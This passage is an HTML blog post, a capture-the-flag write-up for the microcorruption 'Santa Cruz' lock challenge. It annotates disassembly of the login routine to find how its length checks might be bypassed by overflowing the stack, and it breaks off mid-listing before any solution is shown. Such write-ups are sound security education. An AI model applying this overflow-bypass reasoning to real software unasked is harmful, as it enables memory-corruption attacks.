<!doctype html><html lang=en>
<head>
<title>
microcorruption - santa cruz ::
#!/bin/note
— a checkbox uncheckers notepad
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content=" This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.
The challenge has the following description when you start:
 This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.
 Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.
">
<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
<meta name=robots content="noodp">
<link rel=canonical href=https://leonjza.github.io/blog/2018/03/11/microcorruption-santa-cruz/>
<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
<link rel=stylesheet href=https://leonjza.github.io/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="microcorruption - santa cruz">
<meta name=twitter:description content="
    
    
  


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.
The challenge has the following description when you start:

This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.

Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.">
<meta property="og:title" content="microcorruption - santa cruz">
<meta property="og:description" content="
    
    
  


This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.
The challenge has the following description when you start:

This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.

Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2018/03/11/microcorruption-santa-cruz/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2018-03-11T20:23:43+02:00">
<meta property="article:modified_time" content="2018-03-11T20:23:43+02:00"><meta property="og:site_name" content="#!/bin/note
">
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>#!/bin/note
</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about/>About Me</a></li>
<li><a href=/categories>Categories</a></li>
<li><a href=/posts>Posts</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>microcorruption - santa cruz</h1>
<div class=post-meta>
<span class=post-date>
2018-03-11
</span>
<span class=post-read-time>— 10 min read</span>
</div>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#santa-cruz>santa cruz</a>
<ul>
<li><a href=#debugging>debugging</a></li>
</ul>
</li>
<li><a href=#solution>solution</a></li>
<li><a href=#other-challenges>other challenges</a></li>
</ul>
</li>
</ul>
</nav></aside>
<figure class=left>
<img src=/images/microcorruption/microcorruption.png>
</figure>
<p>This post is part of the series of solving <a href=https://microcorruption.com>microcorruption.com</a> ctf challenges which continues from the <a href=https://leonjza.github.io/blog/2018/03/09/microcorruption---johannesburg/>previous challenge</a> called <em>Johannesburg</em>. This challenge is titled <em>Santa Cruz</em>.</p>
<p>The challenge has the following description when you start:</p>
<blockquote>
<p>This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.</p>
</blockquote>
<p>Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.</p>
<h2 id=santa-cruz>santa cruz</h2>
<p>Static analysis of the programs' code showed that we are calling <code>login</code> from <code>main</code> again, after adjusting the stack pointer.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>4438</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#a6e22e>main</span><span style=color:#960050;background-color:#1e0010>&gt;</span>
<span style=color:#960050;background-color:#1e0010>4438:</span>  <span style=color:#960050;background-color:#1e0010>3150</span> <span style=color:#a6e22e>ceff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffce, sp
</span><span style=color:#75715e></span><span style=color:#ae81ff>443</span><span style=color:#66d9ef>c</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>5045</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4550 &lt;login&gt;
</span></code></pre></div><p>Nothing too interesting. However, <code>login</code> was <em>much</em> larger when compared to previous versions we have seen. Once I finished skimming through <code>login</code>, I noticed that this program contained a number of methods that don&rsquo;t seem to be called at all. For example, <code>test_username_and_password_valid</code>, <code>putchar</code> and <code>getchar</code>.</p>
<p>It quickly became evident that most of the important logic was within <code>login</code>. As previously mentioned, this routine was quite large, so lets take a closer look at it in smaller chunks.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>4550</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#a6e22e>login</span><span style=color:#960050;background-color:#1e0010>&gt;</span>
<span style=color:#960050;background-color:#1e0010>4550:</span>  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>b12</span>           <span style=color:#66d9ef>push</span>  <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>4552:</span>  <span style=color:#960050;background-color:#1e0010>0412</span>           <span style=color:#a6e22e>push</span>  <span style=color:#66d9ef>r4</span>
<span style=color:#960050;background-color:#1e0010>4554:</span>  <span style=color:#960050;background-color:#1e0010>0441</span>           <span style=color:#a6e22e>mov</span>   <span style=color:#66d9ef>sp</span>, <span style=color:#66d9ef>r4</span>
<span style=color:#960050;background-color:#1e0010>4556:</span>  <span style=color:#960050;background-color:#1e0010>2452</span>           <span style=color:#a6e22e>add</span>   <span style=color:#75715e>#0x4, r4
</span><span style=color:#75715e></span><span style=color:#ae81ff>4558</span>:  <span style=color:#ae81ff>3150</span> <span style=color:#66d9ef>d8ff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffd8, sp
</span><span style=color:#75715e></span><span style=color:#ae81ff>455</span><span style=color:#66d9ef>c</span>:  <span style=color:#66d9ef>c443</span> <span style=color:#66d9ef>faff</span>      <span style=color:#66d9ef>mov.b</span> <span style=color:#75715e>#0x0, -0x6(r4)
</span><span style=color:#75715e></span><span style=color:#ae81ff>4560</span>:  <span style=color:#66d9ef>f442</span> <span style=color:#66d9ef>e7ff</span>      <span style=color:#66d9ef>mov.b</span> <span style=color:#75715e>#0x8, -0x19(r4)
</span><span style=color:#75715e></span><span style=color:#ae81ff>4564</span>:  <span style=color:#66d9ef>f440</span> <span style=color:#ae81ff>1000</span> <span style=color:#66d9ef>e8ff</span> <span style=color:#66d9ef>mov.b</span> <span style=color:#75715e>#0x10, -0x18(r4)
</span></code></pre></div><p>The beginning of <code>login</code> contained three interesting instructions to move the bytes <code>0x0</code>, <code>0x8</code> and <code>0x10</code> into very specific locations within memory. This caught my eye pretty quickly and they are important so keep them in mind.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>456</span>a:  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>f40</span> <span style=color:#ae81ff>8444</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x4484 &#34;Authentication now requires a username and password.&#34;, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>456</span><span style=color:#66d9ef>e</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4572</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#66d9ef>b944</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x44b9 &#34;Remember: both are between 8 and 16 characters.&#34;, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>4576</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span></code></pre></div><p>This section is pretty vanilla. It simply prints out some strings. Notice though the fact that both the username and password is supposed to be between 8 (<code>0x8</code>) and 16 (<code>0x10</code>) characters.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>457</span>a:  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>f40</span> <span style=color:#66d9ef>e944</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x44e9 &#34;Please enter your username:&#34;, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>457</span><span style=color:#66d9ef>e</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4582</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>e40</span> <span style=color:#ae81ff>6300</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x63, r14
</span><span style=color:#75715e></span><span style=color:#ae81ff>4586</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#ae81ff>0424</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x2404, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>458</span><span style=color:#66d9ef>a</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>1847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4718 &lt;getsn&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>458</span><span style=color:#66d9ef>e</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#ae81ff>0424</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x2404, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>4592</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4596</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>e40</span> <span style=color:#ae81ff>0424</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x2404, r14
</span><span style=color:#75715e></span><span style=color:#ae81ff>459</span><span style=color:#66d9ef>a</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f44</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>r4</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>459</span>c:  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>f50</span> <span style=color:#66d9ef>d6ff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffd6, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>a0</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>5447</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4754 &lt;strcpy&gt;
</span><span style=color:#75715e></span>
<span style=color:#960050;background-color:#1e0010>45</span>a4:  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>f40</span> <span style=color:#ae81ff>0545</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x4505 &#34;Please enter your password:&#34;, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>a8</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>ac</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>e40</span> <span style=color:#ae81ff>6300</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x63, r14
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>b0</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#ae81ff>0424</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x2404, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>b4</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>1847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4718 &lt;getsn&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>b8</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#ae81ff>0424</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x2404, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>bc</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>c0</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>b44</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>r4</span>, <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>45</span>c2:  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>b50</span> <span style=color:#66d9ef>e9ff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffe9, r11
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>c6</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>e40</span> <span style=color:#ae81ff>0424</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x2404, r14
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>ca</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f4b</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>r11</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>45</span>cc:  <span style=color:#a6e22e>b012</span> <span style=color:#ae81ff>5447</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4754 &lt;strcpy&gt;
</span></code></pre></div><p>Much like the previous challenge, this section simply gets the username and password from the user. Once a value has been captured, <code>strcpy</code> is called to move the data to another section in memory after echoing it back to the user.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>45</span>d0:  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>f4b</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>r11</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>45</span>d2:  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>e44</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>r4</span>, <span style=color:#66d9ef>r14</span>
<span style=color:#960050;background-color:#1e0010>45</span>d4:  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>e50</span> <span style=color:#66d9ef>e8ff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffe8, r14
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>d8</span>:  <span style=color:#ae81ff>1</span><span style=color:#66d9ef>e53</span>           <span style=color:#66d9ef>inc</span>   <span style=color:#66d9ef>r14</span>
<span style=color:#960050;background-color:#1e0010>45</span>da:  <span style=color:#a6e22e>ce93</span> <span style=color:#ae81ff>0000</span>      <span style=color:#66d9ef>tst.b</span> <span style=color:#ae81ff>0x0</span>(<span style=color:#66d9ef>r14</span>)
<span style=color:#960050;background-color:#1e0010>45</span>de:  <span style=color:#a6e22e>fc23</span>           <span style=color:#66d9ef>jnz</span>   <span style=color:#75715e>#0x45d8 &lt;login+0x88&gt;
</span><span style=color:#75715e></span>
<span style=color:#75715e>; the loop is done
</span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>45</span>e0:  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>b4e</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>r14</span>, <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>45</span>e2:  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>b8f</span>           <span style=color:#66d9ef>sub</span>   <span style=color:#66d9ef>r15</span>, <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>45</span>e4:  <span style=color:#960050;background-color:#1e0010>5</span><span style=color:#a6e22e>f44</span> <span style=color:#66d9ef>e8ff</span>      <span style=color:#66d9ef>mov.b</span> -<span style=color:#ae81ff>0x18</span>(<span style=color:#66d9ef>r4</span>), <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>45</span>e8:  <span style=color:#960050;background-color:#1e0010>8</span><span style=color:#a6e22e>f11</span>           <span style=color:#66d9ef>sxt</span>   <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>45</span>ea:  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>b9f</span>           <span style=color:#66d9ef>cmp</span>   <span style=color:#66d9ef>r15</span>, <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>45</span>ec:  <span style=color:#960050;background-color:#1e0010>0628</span>           <span style=color:#a6e22e>jnc</span>   <span style=color:#75715e>#0x45fa &lt;login+0xaa&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>ee</span>:  <span style=color:#ae81ff>1</span><span style=color:#66d9ef>f42</span> <span style=color:#ae81ff>0024</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#960050;background-color:#1e0010>&amp;</span><span style=color:#ae81ff>0x2400</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>45</span>f2:  <span style=color:#a6e22e>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>45</span><span style=color:#66d9ef>f6</span>:  <span style=color:#ae81ff>3040</span> <span style=color:#ae81ff>4044</span>      <span style=color:#66d9ef>br</span>    <span style=color:#75715e>#0x4440 &lt;__stop_progExec__&gt;
</span></code></pre></div><p>This section seems to have a loop, incrementing <code>r14</code> until the byte at the memory location pointed to by <code>r14</code> is <code>0x0</code>. A length counter maybe? After the loop, the byte at <code>-0x18(r4)</code> (which is set to <code>0x10</code> at the start of the <code>login</code> routine remember?) is compared to that which is in <code>r15</code>. Depending on the outcome of the <code>cmp</code> at <code>0x45ea</code>, the program may be stopped. I guess this is the overflow protection implemented.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>45</span>fa:  <span style=color:#960050;background-color:#1e0010>5</span><span style=color:#a6e22e>f44</span> <span style=color:#66d9ef>e7ff</span>      <span style=color:#66d9ef>mov.b</span> -<span style=color:#ae81ff>0x19</span>(<span style=color:#66d9ef>r4</span>), <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>45</span>fe:  <span style=color:#960050;background-color:#1e0010>8</span><span style=color:#a6e22e>f11</span>           <span style=color:#66d9ef>sxt</span>   <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>4600:</span>  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>b9f</span>           <span style=color:#66d9ef>cmp</span>   <span style=color:#66d9ef>r15</span>, <span style=color:#66d9ef>r11</span>
<span style=color:#960050;background-color:#1e0010>4602:</span>  <span style=color:#960050;background-color:#1e0010>062</span><span style=color:#a6e22e>c</span>           <span style=color:#66d9ef>jc</span>    <span style=color:#75715e>#0x4610 &lt;login+0xc0&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4604</span>:  <span style=color:#ae81ff>1</span><span style=color:#66d9ef>f42</span> <span style=color:#ae81ff>0224</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#960050;background-color:#1e0010>&amp;</span><span style=color:#ae81ff>0x2402</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>4608:</span>  <span style=color:#a6e22e>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>460</span><span style=color:#66d9ef>c</span>:  <span style=color:#ae81ff>3040</span> <span style=color:#ae81ff>4044</span>      <span style=color:#66d9ef>br</span>    <span style=color:#75715e>#0x4440 &lt;__stop_progExec__&gt;
</span></code></pre></div><p>Similarly, another <code>cmp</code> is done with the value at <code>-0x19(r4)</code> (which was set to <code>0x8</code> at the beginning of <code>login</code>) with a similar abrupt stop if it fails. This is most likely the lower bounds checking.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>4610:</span>  <span style=color:#a6e22e>c443</span> <span style=color:#66d9ef>d4ff</span>      <span style=color:#66d9ef>mov.b</span> <span style=color:#75715e>#0x0, -0x2c(r4)
</span><span style=color:#75715e></span><span style=color:#ae81ff>4614</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#66d9ef>d4ff</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0xffd4, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>4618</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f54</span>           <span style=color:#66d9ef>add</span>   <span style=color:#66d9ef>r4</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>461</span>a:  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>f12</span>           <span style=color:#66d9ef>push</span>  <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>461</span>c:  <span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>f44</span>           <span style=color:#66d9ef>mov</span>   <span style=color:#66d9ef>r4</span>, <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>461</span>e:  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>f50</span> <span style=color:#66d9ef>e9ff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffe9, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>4622</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f12</span>           <span style=color:#66d9ef>push</span>  <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>4624:</span>  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>f50</span> <span style=color:#66d9ef>edff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffed, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>4628</span>:  <span style=color:#ae81ff>0</span><span style=color:#66d9ef>f12</span>           <span style=color:#66d9ef>push</span>  <span style=color:#66d9ef>r15</span>
<span style=color:#960050;background-color:#1e0010>462</span>a:  <span style=color:#960050;background-color:#1e0010>3012</span> <span style=color:#960050;background-color:#1e0010>7</span><span style=color:#a6e22e>d00</span>      <span style=color:#66d9ef>push</span>  <span style=color:#75715e>#0x7d
</span><span style=color:#75715e></span><span style=color:#ae81ff>462</span><span style=color:#66d9ef>e</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#66d9ef>c446</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x46c4 &lt;INT&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4632</span>:  <span style=color:#ae81ff>3152</span>           <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0x8, sp
</span><span style=color:#75715e></span><span style=color:#ae81ff>4634</span>:  <span style=color:#66d9ef>c493</span> <span style=color:#66d9ef>d4ff</span>      <span style=color:#66d9ef>tst.b</span> -<span style=color:#ae81ff>0x2c</span>(<span style=color:#66d9ef>r4</span>)
<span style=color:#960050;background-color:#1e0010>4638:</span>  <span style=color:#960050;background-color:#1e0010>0524</span>           <span style=color:#a6e22e>jz</span>    <span style=color:#75715e>#0x4644 &lt;login+0xf4&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>463</span><span style=color:#66d9ef>a</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>4</span><span style=color:#66d9ef>a44</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x444a &lt;unlock_door&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>463</span><span style=color:#66d9ef>e</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#ae81ff>2145</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x4521 &#34;Access granted.&#34;, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>4642</span>:  <span style=color:#ae81ff>023</span><span style=color:#66d9ef>c</span>           <span style=color:#66d9ef>jmp</span>   <span style=color:#75715e>#0x4648 &lt;login+0xf8&gt;
</span><span style=color:#75715e></span><span style=color:#ae81ff>4644</span>:  <span style=color:#ae81ff>3</span><span style=color:#66d9ef>f40</span> <span style=color:#ae81ff>3145</span>      <span style=color:#66d9ef>mov</span>   <span style=color:#75715e>#0x4531 &#34;That password is not correct.&#34;, r15
</span><span style=color:#75715e></span><span style=color:#ae81ff>4648</span>:  <span style=color:#66d9ef>b012</span> <span style=color:#ae81ff>2847</span>      <span style=color:#66d9ef>call</span>  <span style=color:#75715e>#0x4728 &lt;puts&gt;
</span></code></pre></div><p>For this next section, it looks like the stack is being setup for syscall <code>0x7d</code> to be called. Depending on the result, <code>unlock_door</code> would be called or a message would simply be printed saying that the password was incorrect.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>464</span>c:  <span style=color:#a6e22e>c493</span> <span style=color:#66d9ef>faff</span>      <span style=color:#66d9ef>tst.b</span> -<span style=color:#ae81ff>0x6</span>(<span style=color:#66d9ef>r4</span>)
<span style=color:#960050;background-color:#1e0010>4650:</span>  <span style=color:#960050;background-color:#1e0010>0624</span>           <span style=color:#a6e22e>jz</span>    <span style=color:#75715e>#0x465e &lt;login+0x10e&gt;
